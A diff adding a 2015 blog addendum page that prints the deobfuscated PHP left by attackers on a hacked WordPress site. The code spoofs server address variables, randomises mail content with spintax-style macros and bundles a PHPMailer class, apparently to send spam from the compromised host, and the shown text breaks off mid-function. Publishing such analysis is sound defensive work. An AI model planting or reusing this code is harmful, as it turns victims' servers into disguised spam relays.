@@ -1,0 +1,2671 @@
+
+<!DOCTYPE html>
+<html lang="en-us">
+
+    <head>
+
+        <meta charset="utf-8" />
+        <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+
+        <meta property="og:title" content=" Deobfuscated code from the WordPress hack &middot;  Samuel Debruyn" />
+        <meta name="twitter:title" content=" Deobfuscated code from the WordPress hack &middot;  Samuel Debruyn" />
+        <title> Deobfuscated code from the WordPress hack &middot;  Samuel Debruyn</title>
+        
+        <meta property="og:site_name" content="Samuel Debruyn" />
+        <meta property="og:locale " content="en-us" />
+        
+        <meta property="og:url" content="http://sa.muel.be/addendum/2015/deobfuscated-code-from-the-wordpress-hack/" />
+        <meta name="twitter:url" content="http://sa.muel.be/addendum/2015/deobfuscated-code-from-the-wordpress-hack/" />
+        <link rel="canonical" href="http://sa.muel.be/addendum/2015/deobfuscated-code-from-the-wordpress-hack/" />
+        
+        <meta name="description" content="personal website and blog of Samuel Debruyn" />
+        <meta name="twitter:description" content="personal website and blog of Samuel Debruyn">
+        <meta property="og:description" content="personal website and blog of Samuel Debruyn" />
+        
+        <meta name="twitter:site" content="@SamuelDebruyn" />
+        <meta name="twitter:creator" content="@SamuelDebruyn" />
+
+    
+    
+        <meta name="twitter:card" content="summary" />
+        <meta property="og:type" content="article" />
+        <meta property="og:article:published_time" content="2015-06-27T18:13:15&#43;02:00" />
+        <meta property="og:article:section" content="addendum" />
+        <meta property="og:article:author" content="http://sa.muel.be/about/" />
+        
+        <script type="application/ld+json">
+            { 
+                "@context": "http://schema.org",
+                "@type": "BlogPosting",
+                "headline": "Deobfuscated code from the WordPress hack",
+                "name": "Deobfuscated code from the WordPress hack",
+                "author": {
+                    "@type": "Person",
+"name": "Samuel Debruyn",
+"birthDate": "1992-04-11",
+"email": "s@muel.be",
+"nationality": "BE",
+"gender": "male",
+"givenName": "Samuel",
+"familyName": "Debruyn",
+"url": "http:\/\/sa.muel.be\/",
+"sameAs":
+	[
+		"https://twitter.com/SamuelDebruyn",
+		"https://be.linkedin.com/in/samueldebruyn",
+		"https://github.com/SamuelDebruyn"
+	]
+                },
+                "datePublished": "2015-06-27",
+                
+                "wordCount":  7277 ,
+                "articleSection": "addendum",
+                "timeRequired": "0:35:0",
+                "url": "http:\/\/sa.muel.be\/addendum\/2015\/deobfuscated-code-from-the-wordpress-hack\/"
+            }
+        </script>
+        
+    
+ 
+        <meta name="HandheldFriendly" content="True" />
+        <meta name="MobileOptimized" content="320" />
+        <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+        
+        <link rel="apple-touch-icon" sizes="57x57" href="http://sa.muel.be/icons/apple-touch-icon-57x57.png">
+        <link rel="apple-touch-icon" sizes="60x60" href="http://sa.muel.be/icons/apple-touch-icon-60x60.png">
+        <link rel="apple-touch-icon" sizes="72x72" href="http://sa.muel.be/icons/apple-touch-icon-72x72.png">
+        <link rel="apple-touch-icon" sizes="76x76" href="http://sa.muel.be/icons/apple-touch-icon-76x76.png">
+        <link rel="apple-touch-icon" sizes="114x114" href="http://sa.muel.be/icons/apple-touch-icon-114x114.png">
+        <link rel="apple-touch-icon" sizes="120x120" href="http://sa.muel.be/icons/apple-touch-icon-120x120.png">
+        <link rel="apple-touch-icon" sizes="144x144" href="http://sa.muel.be/icons/apple-touch-icon-144x144.png">
+        <link rel="apple-touch-icon" sizes="152x152" href="http://sa.muel.be/icons/apple-touch-icon-152x152.png">
+        <link rel="apple-touch-icon" sizes="180x180" href="http://sa.muel.be/icons/apple-touch-icon-180x180.png">
+        <link rel="icon" type="image/png" href="http://sa.muel.be/icons/favicon-32x32.png" sizes="32x32">
+        <link rel="icon" type="image/png" href="http://sa.muel.be/icons/favicon-194x194.png" sizes="194x194">
+        <link rel="icon" type="image/png" href="http://sa.muel.be/icons/favicon-96x96.png" sizes="96x96">
+        <link rel="icon" type="image/png" href="http://sa.muel.be/icons/android-chrome-192x192.png" sizes="192x192">
+        <link rel="icon" type="image/png" href="http://sa.muel.be/icons/favicon-16x16.png" sizes="16x16">
+        <link rel="manifest" href="http://sa.muel.be/icons/manifest.json">
+        <link rel="shortcut icon" href="http://sa.muel.be/icons/favicon.ico">
+        <meta name="apple-mobile-web-app-title" content="sa.muel.be">
+        <meta name="application-name" content="sa.muel.be">
+        <meta name="msapplication-TileColor" content="#2c3e50">
+        <meta name="msapplication-TileImage" content="http://sa.muel.be/icons/mstile-144x144.png">
+        <meta name="msapplication-config" content="http://sa.muel.be/icons/browserconfig.xml">
+        <meta name="theme-color" content="#2c3e50">
+
+        
+          
+
+        <link href="http://sa.muel.be/post/index.xml" rel="alternate" type="application/rss+xml" title="RSS &middot; Samuel Debruyn" />
+    
+    <style>
+*{padding:0;margin:0}body,html{font-size:1em;line-height:1.65em;font-family:"Lato",sans-serif;font-weight:300;color:#34495e;background-color:#ecf0f1}html{height:100%}body{padding:2em 2.5em 1em 20em}header{border-right:1px #bdc3c7 solid;padding:2em;position:fixed;top:0;left:0;height:100%;width:13.5em;background-color:#2c3e50}#content{display:block;width:100%}footer{padding:1em 0 2.5em;font-size:.8em;line-height:1.5em;color:#95a5a6}article{border-bottom:.1em #bdc3c7 solid;padding-bottom:1.7em;max-width:56em}h4,h5,h6,hr,p{margin-top:.9em;margin-bottom:.9em}h1,h2,h3,h4,h5,h6{font-family:"Oswald","Lato",sans-serif;font-weight:400!important}h1{font-size:2.5em;line-height:1.1em;margin-top:.6em;margin-bottom:.6em}h2{font-size:1.9em;line-height:1.2em;margin-top:.7em;margin-bottom:.7em}h3{font-size:1.4em;line-height:1.3em;margin-top:.8em;margin-bottom:.8em}h4{font-size:1.3em}h5{font-size:1.2em}h6{font-size:1.1em}iframe,img{max-width:100%}a{font-weight:700;text-decoration:none;color:#e74c3c}a:hover{text-decoration:underline}h1 a,h2 a,h3 a,h4 a,h5 a,h6 a{font-weight:400}strong{font-weight:700}blockquote{border-left:.4em solid #bdc3c7;padding-left:1.2em;font-size:1.3em}hr{border:0;height:1px;background:#bdc3c7}ol,ul{margin-left:3em}code{font-size:1.2em;background:#bdc3c7}pre{font-size:.8em;line-height:2em;background:#bdc3c7;padding:1em;word-break:break-all;word-wrap:break-word;white-space:pre;white-space:-moz-pre-wrap;white-space:pre-wrap}input{font-size:1em;padding:.3em}header h1{font-size:1.9em;margin-top:.8em;margin-bottom:.6em}header a{color:#1abc9c}header h1 a:hover{text-decoration:none}header #logo img{width:9em;height:9em;border-radius:4.5em;-moz-border-radius:4.5em;-webkit-border-radius:4.5em;border:0}#follow-icons{font-size:.7em;margin-top:-.7em;margin-bottom:1.5em}#follow-icons a{color:#ccc}#follow-icons span{vertical-align:top;margin-left:-.15em;margin-right:-.15em}#follow-icons span .fa-stack-1x{font-size:1.05em;line-height:1.9em}header h6{margin-top:.5em}article span.post-stamp{color:#888}h1.post-title{margin-top:.35em;margin-bottom:.6em}h3.post-title{margin-top:.4em;padding-bottom:.9em;border-bottom:1px solid #bdc3c7;font-size:1.2em;color:#34495e;font-family:"Lato",sans-serif;font-weight:700!important}h3.post-title>time{font-family:"Lato",sans-serif;font-weight:300!important;font-size:.9em}.post-title .feature-star{font-size:.9em}.feature-star,.separator{color:#ccc}#social-bar{margin-top:1.5em;background-color:#bdc3c7;padding:.5em}.pagination{margin-bottom:1em}footer a{font-weight:300;color:#95a5a6;text-decoration:underline}footer a:hover{color:#7f8c8d;text-decoration:none}.uk-search{display:inline-block;position:relative;margin:0}.uk-search:before{content:"\f002";position:absolute;top:0;left:0;width:30px;line-height:40px;text-align:center;font-family:FontAwesome;font-size:14px;color:#1abc9c}.uk-search-field::-moz-focus-inner{border:0;padding:0}.uk-search-field::-webkit-search-cancel-button,.uk-search-field::-webkit-search-decoration{-webkit-appearance:none}.uk-search-field::-ms-clear{display:none}.uk-search-field::-moz-placeholder{opacity:1}.uk-search-field{font-family:"Oswald","Lato",sans-serif;color:#ecf0f1;-webkit-appearance:none;width:120px;height:30px;padding:0 0 0 30px;border:0;background:rgba(0,0,0,0);-webkit-transition:all linear .2s;transition:all linear .2s;vertical-align:middle}.uk-search-field:-ms-input-placeholder{color:#95a5a6!important}.uk-search-field::-moz-placeholder{color:#95a5a6}.uk-search-field::-webkit-input-placeholder{color:#95a5a6}.uk-search-field:focus{outline:0}.uk-search-field:focus,.uk-search.uk-active .uk-search-field{width:180px}.gs-image-box,.gsc-above-wrapper-area,.gsc-cursor-box,.gsc-url-bottom,.gsc-thumbnail,.gs-per-result-labels{display:none!important;visibility:hidden!important}.gsc-control-cse,.gsc-results{font:inherit!important;background:inherit!important;border:inherit!important;padding:inherit!important;margin:inherit!important}.gsc-result{border:inherit!important;background:inherit!important;padding:inherit!important}.gs-title{font-family:"Lato",sans-serif!important;color:#e74c3c!important;text-decoration:none!important;height:inherit!important;overflow:inherit!important}.gs-snippet{color:inherit!important;font-family:"Lato",sans-serif!important;height:inherit!important;overflow:inherit!important}@media only screen and (min-width:1281px){body,html{font-size:1.1em}}@media only screen and (max-width:800px){body{padding:0}header{border-right:0;border-bottom:1px #bdc3c7 solid;position:relative;height:auto;width:auto;text-align:center;padding-bottom:1em}#content{margin-left:0;padding:2em 2em 1em;width:auto}footer{padding:0 2.5em 2em}}@media only screen and (max-width:320px){#content,header{padding:1.2em 1.2em .6em}footer{padding:0 1.5em 1.2em}ol,ul{margin-left:2em}}
+</style>
+    </head>
+    <body>
+        <header id="header">
+            <a id="logo" href="http://sa.muel.be/"><img src="http://sa.muel.be/avatar.jpg" alt="Samuel Debruyn" /></a>
+            <h1><a href="http://sa.muel.be/">Samuel Debruyn</a></h1>
+
+            <div id="follow-icons">
+	<a href="http://twitter.com/samueldebruyn" rel="me"><i class="fa fa-twitter-square fa-2x"></i></a>
+	<a href="http://linkedin.com/in/samueldebruyn" rel="me"><i class="fa fa-linkedin-square fa-2x"></i></a>
+	<a href="http://github.com/samueldebruyn" rel="me"><i class="fa fa-github-square fa-2x"></i></a>
+	<a href="http://sa.muel.be/post/index.xml" rel="me"><i class="fa fa-rss-square fa-2x"></i></a> 
+</div>  
+            <h6><a href="http://sa.muel.be/">Home</a></h6>
+<h6><a href="http://sa.muel.be/about">About me</a></h6>
+            
+            <form class="uk-search" action="http://sa.muel.be/search/">
+                <input class="uk-search-field" id="q" name="q" type="search" placeholder="search..." />
+            </form>
+            
+        </header>
+<main id="content">
+
+<article class="addendum">
+    <div class="post-stamp">
+        <time datetime="2015-06-27T18:13:15&#43;02:00">
+            27 Jun 2015
+        </time>
+    </div>
+    <h1 class="post-title">Deobfuscated code from the WordPress hack</h1>
+    <p>This page is part of the blogpost <a href="/2015/about-that-time-i-dealt-with-a-bunch-of-hackers-on-a-wordpress/">About that time I dealt with a bunch of hackers on a WordPress</a>.</p>
+
+<p>The following is the deobfuscated version of <a href="/addendum/2015/obfuscated-code-from-the-wordpress-hack/">this</a>.</p>
+
+<pre><code>&lt;?php
+if (isset($_SERVER)) {
+    $_SERVER['PHP_SELF']    = &quot;/&quot;;
+    $_SERVER['REMOTE_ADDR'] = &quot;127.0.0.1&quot;;
+    if (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
+        $_SERVER['HTTP_X_FORWARDED_FOR'] = &quot;127.0.0.1&quot;;
+    }
+}
+if (isset($_FILES)) {
+    foreach ($_FILES as $key =&gt; $file) {
+        if (!strpos($file['name'], &quot;.jpg&quot;)) {
+            $filename             = alter_macros($file['name']);
+            $filename             = num_macros($filename);
+            $filename             = xnum_macros($filename);
+            $_FILES[$key][&quot;name&quot;] = $filename;
+        }
+    }
+}
+function custom_strip_tags($text)
+{
+    $text = strip_tags($text, '&lt;a&gt;');
+    $text = str_replace(&quot;&lt;a href=\&quot;&quot;, &quot;[ &quot;, $text);
+    $text = str_replace(&quot;&lt;/a&gt;&quot;, &quot;&quot;, $text);
+    $text = str_replace(&quot;\&quot;&gt;&quot;, &quot; ] &quot;, $text);
+
+    return $text;
+}
+
+function is_ip($str)
+{
+    return preg_match(&quot;/^([1-9]|[1-9][0-9]|1[0-9][0-9]|2[0-4][0-9]|25[0-5])(\.([0-9]|[1-9][0-9]|1[0-9][0-9]|2[0-4][0-9]|25[0-5])){3}$/&quot;, $str);
+}
+
+function from_host($content)
+{
+
+    $host = preg_replace('/^(www|ftp)\./i', '', @$_SERVER['HTTP_HOST']);
+
+    if (is_ip($host)) {
+        return $content;
+    }
+
+    $tokens = explode(&quot;@&quot;, $content);
+
+    $content = $tokens[0] . &quot;@&quot; . $host . &quot;&gt;&quot;;
+
+    return $content;
+}
+
+function alter_macros($content)
+{
+    preg_match_all('#{(.*)}#Ui', $content, $matches);
+
+    for ($i = 0; $i &lt; count($matches[1]); $i++) {
+
+        $ns      = explode(&quot;|&quot;, $matches[1][$i]);
+        $c2      = count($ns);
+        $rand    = rand(0, ($c2 - 1));
+        $content = str_replace(&quot;{&quot; . $matches[1][$i] . &quot;}&quot;, $ns[$rand], $content);
+    }
+    return $content;
+}
+
+
+function xnum_macros($content)
+{
+    preg_match_all('#\[NUM\-([[:digit:]]+)\]#', $content, $matches);
+
+    for ($i = 0; $i &lt; count($matches[0]); $i++) {
+        $num = $matches[1][$i];
+        $min = pow(10, $num - 1);
+        $max = pow(10, $num) - 1;
+
+        $rand    = rand($min, $max);
+        $content = str_replace($matches[0][$i], $rand, $content);
+    }
+    return $content;
+}
+
+function num_macros($content)
+{
+    preg_match_all('#\[RAND\-([[:digit:]]+)\-([[:digit:]]+)\]#', $content, $matches);
+
+    for ($i = 0; $i &lt; count($matches[0]); $i++) {
+        $min     = $matches[1][$i];
+        $max     = $matches[2][$i];
+        $rand    = rand($min, $max);
+        $content = str_replace($matches[0][$i], $rand, $content);
+    }
+    return $content;
+}
+
+
+function fteil_macros($content, $fteil)
+{
+    return str_replace(&quot;[FTEIL]&quot;, $fteil, $content);
+}
+
+class PHPMailer
+{
+    public $Version = '5.2.9';
+
+    public $Priority = 3;
+
+    public $CharSet = 'iso-8859-1';
+
+    public $ContentType = 'text/plain';
+
+    public $Encoding = '8bit';
+
+    public $ErrorInfo = '';
+
+    public $From = 'root@localhost';
+
+    public $FromName = 'Root User';
+
+    public $Sender = '';
+
+    public $ReturnPath = '';
+
+    public $Subject = '';
+
+    public $Body = '';
+
+    public $AltBody = '';
+
+    public $Ical = '';
+
+    protected $MIMEBody = '';
+
+    protected $MIMEHeader = '';
+
+    protected $mailHeader = '';
+
+    public $WordWrap = 0;
+
+    public $Mailer = 'mail';
+
+    public $Sendmail = '/usr/sbin/sendmail';
+
+    public $UseSendmailOptions = true;
+
+    public $PluginDir = '';
+
+    public $ConfirmReadingTo = '';
+
+    public $Hostname = '';
+
+    public $MessageID = '';
+
+    public $MessageDate = '';
+
+    public $Host = 'localhost';
+
+    public $Port = 25;
+
+    public $Helo = '';
+
+    public $SMTPSecure = '';
+
+    public $SMTPAuth = false;
+
+    public $Username = '';
+
+    public $Password = '';
+
+    public $AuthType = '';
+
+    public $Realm = '';
+
+    public $Workstation = '';
+
+    public $Timeout = 300;
+
+    public $SMTPDebug = 0;
+
+    public $Debugoutput = 'echo';
+
+    public $SMTPKeepAlive = false;
+
+    public $SingleTo = false;
+
+    public $SingleToArray = array();
+
+    public $do_verp = false;
+
+    public $AllowEmpty = false;
+
+    public $LE = &quot;\n&quot;;
+
+    public $DKIM_selector = '';
+
+    public $DKIM_identity = '';
+
+    public $DKIM_passphrase = '';
+
+    public $DKIM_domain = '';
+
+    public $DKIM_private = '';
+
+    public $action_function = '';
+
+    public $XMailer = '';
+
+    protected $smtp = null;
+
+    protected $to = array();
+
+    protected $cc = array();
+
+    protected $bcc = array();
+
+    protected $ReplyTo = array();
+
+    protected $all_recipients = array();
+
+    protected $attachment = array();
+
+    protected $CustomHeader = array();
+
+    protected $lastMessageID = '';
+
+    protected $message_type = '';
+
+    protected $boundary = array();
+
+    protected $language = array();
+
+    protected $error_count = 0;
+
+    protected $sign_cert_file = '';
+
+    protected $sign_key_file = '';
+
+    protected $sign_key_pass = '';
+
+    protected $exceptions = false;
+
+    const STOP_MESSAGE = 0;
+
+    const STOP_CONTINUE = 1;
+
+    const STOP_CRITICAL = 2;
+
+    const CRLF = &quot;\r\n&quot;;
+
+    public function __construct($exceptions = false)
+    {
+        $this-&gt;exceptions = (boolean) $exceptions;
+    }
+
+    public function __destruct()
+    {
+
+    }
+
+    private function mailPassthru($to, $subject, $body, $header, $params)
+    {
+        //Check overloading of mail function to avoid double-encoding
+        if (ini_get('mbstring.func_overload') &amp; 1) {
+            $subject = $this-&gt;secureHeader($subject);
+        } else {
+            $subject = $this-&gt;encodeHeader($this-&gt;secureHeader($subject));
+        }
+        if (ini_get('safe_mode') || !($this-&gt;UseSendmailOptions)) {
+            $result = @mail($to, $subject, $body, $header);
+        } else {
+            $result = @mail($to, $subject, $body, $header, $params);
+        }
+        return $result;
+    }
+
+    protected function edebug($str)
+    {
+        if ($this-&gt;SMTPDebug &lt;= 0) {
+            return;
+        }
+        //Avoid clash with built-in function names
+        if (!in_array($this-&gt;Debugoutput, array(
+            'error_log',
+            'html',
+            'echo'
+        )) and is_callable($this-&gt;Debugoutput)) {
+            call_user_func($this-&gt;Debugoutput, $str, $this-&gt;SMTPDebug);
+            return;
+        }
+        switch ($this-&gt;Debugoutput) {
+            case 'error_log':
+                //Don't output, just log
+                error_log($str);
+                break;
+            case 'html':
+                //Cleans up output a bit for a better looking, HTML-safe output
+                echo htmlentities(preg_replace('/[\r\n]+/', '', $str), ENT_QUOTES, 'UTF-8') . &quot;&lt;br&gt;\n&quot;;
+                break;
+            case 'echo':
+            default:
+                //Normalize line breaks
+                $str = preg_replace('/(\r\n|\r|\n)/ms', &quot;\n&quot;, $str);
+                echo gmdate('Y-m-d H:i:s') . &quot;\t&quot; . str_replace(&quot;\n&quot;, &quot;\n                   \t                  &quot;, trim($str)) . &quot;\n&quot;;
+        }
+    }
+
+    public function isHTML($isHtml = true)
+    {
+        if ($isHtml) {
+            $this-&gt;ContentType = 'text/html';
+        } else {
+            $this-&gt;ContentType = 'text/plain';
+        }
+    }
+
+    public function isSMTP()
+    {
+        $this-&gt;Mailer = 'smtp';
+    }
+
+    public function isMail()
+    {
+        $this-&gt;Mailer = 'mail';
+    }
+
+    public function isSendmail()
+    {
+        $ini_sendmail_path = ini_get('sendmail_path');
+
+        if (!stristr($ini_sendmail_path, 'sendmail')) {
+            $this-&gt;Sendmail = '/usr/sbin/sendmail';
+        } else {
+            $this-&gt;Sendmail = $ini_sendmail_path;
+        }
+        $this-&gt;Mailer = 'sendmail';
+    }
+
+    public function isQmail()
+    {
+        $ini_sendmail_path = ini_get('sendmail_path');
+
+        if (!stristr($ini_sendmail_path, 'qmail')) {
+            $this-&gt;Sendmail = '/var/qmail/bin/qmail-inject';
+        } else {
+            $this-&gt;Sendmail = $ini_sendmail_path;
+        }
+        $this-&gt;Mailer = 'qmail';
+    }
+
+    public function addAddress($address, $name = '')
+    {
+        return $this-&gt;addAnAddress('to', $address, $name);
+    }
+
+    public function addCC($address, $name = '')
+    {
+        return $this-&gt;addAnAddress('cc', $address, $name);
+    }
+
+    public function addBCC($address, $name = '')
+    {
+        return $this-&gt;addAnAddress('bcc', $address, $name);
+    }
+
+    public function addReplyTo($address, $name = '')
+    {
+        return $this-&gt;addAnAddress('Reply-To', $address, $name);
+    }
+
+    protected function addAnAddress($kind, $address, $name = '')
+    {
+        if (!preg_match('/^(to|cc|bcc|Reply-To)$/', $kind)) {
+            $this-&gt;setError($this-&gt;lang('Invalid recipient array') . ': ' . $kind);
+            $this-&gt;edebug($this-&gt;lang('Invalid recipient array') . ': ' . $kind);
+            if ($this-&gt;exceptions) {
+                throw new phpmailerException('Invalid recipient array: ' . $kind);
+            }
+            return false;
+        }
+        $address = trim($address);
+        $name    = trim(preg_replace('/[\r\n]+/', '', $name)); //Strip breaks and trim
+        if (!$this-&gt;validateAddress($address)) {
+            $this-&gt;setError($this-&gt;lang('invalid_address') . ': ' . $address);
+            $this-&gt;edebug($this-&gt;lang('invalid_address') . ': ' . $address);
+            if ($this-&gt;exceptions) {
+                throw new phpmailerException($this-&gt;lang('invalid_address') . ': ' . $address);
+            }
+            return false;
+        }
+        if ($kind != 'Reply-To') {
+            if (!isset($this-&gt;all_recipients[strtolower($address)])) {
+                array_push($this-&gt;$kind, array(
+                    $address,
+                    $name
+                ));
+                $this-&gt;all_recipients[strtolower($address)] = true;
+                return true;
+            }
+        } else {
+            if (!array_key_exists(strtolower($address), $this-&gt;ReplyTo)) {
+                $this-&gt;ReplyTo[strtolower($address)] = array(
+                    $address,
+                    $name
+                );
+                return true;
+            }
+        }
+        return false;
+    }
+
+    public function setFrom($address, $name = '', $auto = true)
+    {
+        $address = trim($address);
+        $name    = trim(preg_replace('/[\r\n]+/', '', $name)); //Strip breaks and trim
+        if (!$this-&gt;validateAddress($address)) {
+            $this-&gt;setError($this-&gt;lang('invalid_address') . ': ' . $address);
+            $this-&gt;edebug($this-&gt;lang('invalid_address') . ': ' . $address);
+            if ($this-&gt;exceptions) {
+                throw new phpmailerException($this-&gt;lang('invalid_address') . ': ' . $address);
+            }
+            return false;
+        }
+        $this-&gt;From     = $address;
+        $this-&gt;FromName = $name;
+        if ($auto) {
+            if (empty($this-&gt;Sender)) {
+                $this-&gt;Sender = $address;
+            }
+        }
+        return true;
+    }
+
+    public function getLastMessageID()
+    {
+        return $this-&gt;lastMessageID;
+    }
+
+    public static function validateAddress($address, $patternselect = 'auto')
+    {
+        if (!$patternselect or $patternselect == 'auto') {
+            //Check this constant first so it works when extension_loaded() is disabled by safe mode
+            //Constant was added in PHP 5.2.4
+            if (defined('PCRE_VERSION')) {
+                //This pattern can get stuck in a recursive loop in PCRE &lt;= 8.0.2
+                if (version_compare(PCRE_VERSION, '8.0.3') &gt;= 0) {
+                    $patternselect = 'pcre8';
+                } else {
+                    $patternselect = 'pcre';
+                }
+            } elseif (function_exists('extension_loaded') and extension_loaded('pcre')) {
+                //Fall back to older PCRE
+                $patternselect = 'pcre';
+            } else {
+                //Filter_var appeared in PHP 5.2.0 and does not require the PCRE extension
+                if (version_compare(PHP_VERSION, '5.2.0') &gt;= 0) {
+                    $patternselect = 'php';
+                } else {
+                    $patternselect = 'noregex';
+                }
+            }
+        }
+        switch ($patternselect) {
+            case 'pcre8':
+
+                return (boolean) preg_match('/^(?!(?&gt;(?1)&quot;?(?&gt;\\\[ -~]|[^&quot;])&quot;?(?1)){255,})(?!(?&gt;(?1)&quot;?(?&gt;\\\[ -~]|[^&quot;])&quot;?(?1)){65,}@)' . '((?&gt;(?&gt;(?&gt;((?&gt;(?&gt;(?&gt;\x0D\x0A)?[\t ])+|(?&gt;[\t ]*\x0D\x0A)?[\t ]+)?)(\((?&gt;(?2)' . '(?&gt;[\x01-\x08\x0B\x0C\x0E-\'*-\[\]-\x7F]|\\\[\x00-\x7F]|(?3)))*(?2)\)))+(?2))|(?2))?)' . '([!#-\'*+\/-9=?^-~-]+|&quot;(?&gt;(?2)(?&gt;[\x01-\x08\x0B\x0C\x0E-!#-\[\]-\x7F]|\\\[\x00-\x7F]))*' . '(?2)&quot;)(?&gt;(?1)\.(?1)(?4))*(?1)@(?!(?1)[a-z0-9-]{64,})(?1)(?&gt;([a-z0-9](?&gt;[a-z0-9-]*[a-z0-9])?)' . '(?&gt;(?1)\.(?!(?1)[a-z0-9-]{64,})(?1)(?5)){0,126}|\[(?:(?&gt;IPv6:(?&gt;([a-f0-9]{1,4})(?&gt;:(?6)){7}' . '|(?!(?:.*[a-f0-9][:\]]){8,})((?6)(?&gt;:(?6)){0,6})?::(?7)?))|(?&gt;(?&gt;IPv6:(?&gt;(?6)(?&gt;:(?6)){5}:' . '|(?!(?:.*[a-f0-9]:){6,})(?8)?::(?&gt;((?6)(?&gt;:(?6)){0,4}):)?))?(25[0-5]|2[0-4][0-9]|1[0-9]{2}' . '|[1-9]?[0-9])(?&gt;\.(?9)){3}))\])(?1)$/isD', $address);
+            case 'pcre':
+                //An older regex that doesn't need a recent PCRE
+                return (boolean) preg_match('/^(?!(?&gt;&quot;?(?&gt;\\\[ -~]|[^&quot;])&quot;?){255,})(?!(?&gt;&quot;?(?&gt;\\\[ -~]|[^&quot;])&quot;?){65,}@)(?&gt;' . '[!#-\'*+\/-9=?^-~-]+|&quot;(?&gt;(?&gt;[\x01-\x08\x0B\x0C\x0E-!#-\[\]-\x7F]|\\\[\x00-\xFF]))*&quot;)' . '(?&gt;\.(?&gt;[!#-\'*+\/-9=?^-~-]+|&quot;(?&gt;(?&gt;[\x01-\x08\x0B\x0C\x0E-!#-\[\]-\x7F]|\\\[\x00-\xFF]))*&quot;))*' . '@(?&gt;(?![a-z0-9-]{64,})(?&gt;[a-z0-9](?&gt;[a-z0-9-]*[a-z0-9])?)(?&gt;\.(?![a-z0-9-]{64,})' . '(?&gt;[a-z0-9](?&gt;[a-z0-9-]*[a-z0-9])?)){0,126}|\[(?:(?&gt;IPv6:(?&gt;(?&gt;[a-f0-9]{1,4})(?&gt;:' . '[a-f0-9]{1,4}){7}|(?!(?:.*[a-f0-9][:\]]){8,})(?&gt;[a-f0-9]{1,4}(?&gt;:[a-f0-9]{1,4}){0,6})?' . '::(?&gt;[a-f0-9]{1,4}(?&gt;:[a-f0-9]{1,4}){0,6})?))|(?&gt;(?&gt;IPv6:(?&gt;[a-f0-9]{1,4}(?&gt;:' . '[a-f0-9]{1,4}){5}:|(?!(?:.*[a-f0-9]:){6,})(?&gt;[a-f0-9]{1,4}(?&gt;:[a-f0-9]{1,4}){0,4})?' . '::(?&gt;(?:[a-f0-9]{1,4}(?&gt;:[a-f0-9]{1,4}){0,4}):)?))?(?&gt;25[0-5]|2[0-4][0-9]|1[0-9]{2}' . '|[1-9]?[0-9])(?&gt;\.(?&gt;25[0-5]|2[0-4][0-9]|1[0-9]{2}|[1-9]?[0-9])){3}))\])$/isD', $address);
+            case 'html5':
+                return (boolean) preg_match('/^[a-zA-Z0-9.!#$%&amp;\'*+\/=?^_`{|}~-]+@[a-zA-Z0-9](?:[a-zA-Z0-9-]{0,61}' . '[a-zA-Z0-9])?(?:\.[a-zA-Z0-9](?:[a-zA-Z0-9-]{0,61}[a-zA-Z0-9])?)*$/sD', $address);
+            case 'noregex':
+                return (strlen($address) &gt;= 3 and strpos($address, '@') &gt;= 1 and strpos($address, '@') != strlen($address) - 1);
+            case 'php':
+            default:
+                return (boolean) filter_var($address, FILTER_VALIDATE_EMAIL);
+        }
+    }
+
+    public function send()
+    {
+        try {
+            if (!$this-&gt;preSend()) {
+                return false;
+            }
+            return $this-&gt;postSend();
+        }
+        catch (phpmailerException $exc) {
+            $this-&gt;mailHeader = '';
+            $this-&gt;setError($exc-&gt;getMessage());
+            if ($this-&gt;exceptions) {
+                throw $exc;
+            }
+            return false;
+        }
+    }
+
+    public function preSend()
+    {
+        try {
+            $this-&gt;mailHeader = '';
+            if ((count($this-&gt;to) + count($this-&gt;cc) + count($this-&gt;bcc)) &lt; 1) {
+                throw new phpmailerException($this-&gt;lang('provide_address'), self::STOP_CRITICAL);
+            }
+
+            // Set whether the message is multipart/alternative
+            if (!empty($this-&gt;AltBody)) {
+                $this-&gt;ContentType = 'multipart/alternative';
+            }
+
+            $this-&gt;error_count = 0; // reset errors
+            $this-&gt;setMessageType();
+            // Refuse to send an empty message unless we are specifically allowing it
+            if (!$this-&gt;AllowEmpty and empty($this-&gt;Body)) {
+                throw new phpmailerException($this-&gt;lang('empty_message'), self::STOP_CRITICAL);
+            }
+
+            $this-&gt;MIMEHeader = $this-&gt;createHeader();
+            $this-&gt;MIMEBody   = $this-&gt;createBody();
+
+            if ($this-&gt;Mailer == 'mail') {
+                if (count($this-&gt;to) &gt; 0) {
+                    $this-&gt;mailHeader .= $this-&gt;addrAppend('To', $this-&gt;to);
+                } else {
+                    $this-&gt;mailHeader .= $this-&gt;headerLine('To', 'undisclosed-recipients:;');
+                }
+                $this-&gt;mailHeader .= $this-&gt;headerLine('Subject', $this-&gt;encodeHeader($this-&gt;secureHeader(trim($this-&gt;Subject))));
+            }
+
+            // Sign with DKIM if enabled
+            if (!empty($this-&gt;DKIM_domain) &amp;&amp; !empty($this-&gt;DKIM_private) &amp;&amp; !empty($this-&gt;DKIM_selector) &amp;&amp; file_exists($this-&gt;DKIM_private)) {
+                $header_dkim      = $this-&gt;DKIM_Add($this-&gt;MIMEHeader . $this-&gt;mailHeader, $this-&gt;encodeHeader($this-&gt;secureHeader($this-&gt;Subject)), $this-&gt;MIMEBody);
+                $this-&gt;MIMEHeader = rtrim($this-&gt;MIMEHeader, &quot;\r\n &quot;) . self::CRLF . str_replace(&quot;\r\n&quot;, &quot;\n&quot;, $header_dkim) . self::CRLF;
+            }
+            return true;
+
+        }
+        catch (phpmailerException $exc) {
+            $this-&gt;setError($exc-&gt;getMessage());
+            if ($this-&gt;exceptions) {
+                throw $exc;
+            }
+            return false;
+        }
+    }
+
+    public function postSend()
+    {
+        try {
+            // Choose the mailer and send through it
+            switch ($this-&gt;Mailer) {
+                case 'sendmail':
+                case 'qmail':
+                    return $this-&gt;sendmailSend($this-&gt;MIMEHeader, $this-&gt;MIMEBody);
+                case 'mail':
+                    return $this-&gt;mailSend($this-&gt;MIMEHeader, $this-&gt;MIMEBody);
+                default:
+                    $sendMethod = $this-&gt;Mailer . 'Send';
+                    if (method_exists($this, $sendMethod)) {
+                        return $this-&gt;$sendMethod($this-&gt;MIMEHeader, $this-&gt;MIMEBody);
+                    }
+
+                    return $this-&gt;mailSend($this-&gt;MIMEHeader, $this-&gt;MIMEBody);
+            }
+        }
+        catch (phpmailerException $exc) {
+            $this-&gt;setError($exc-&gt;getMessage());
+            $this-&gt;edebug($exc-&gt;getMessage());
+            if ($this-&gt;exceptions) {
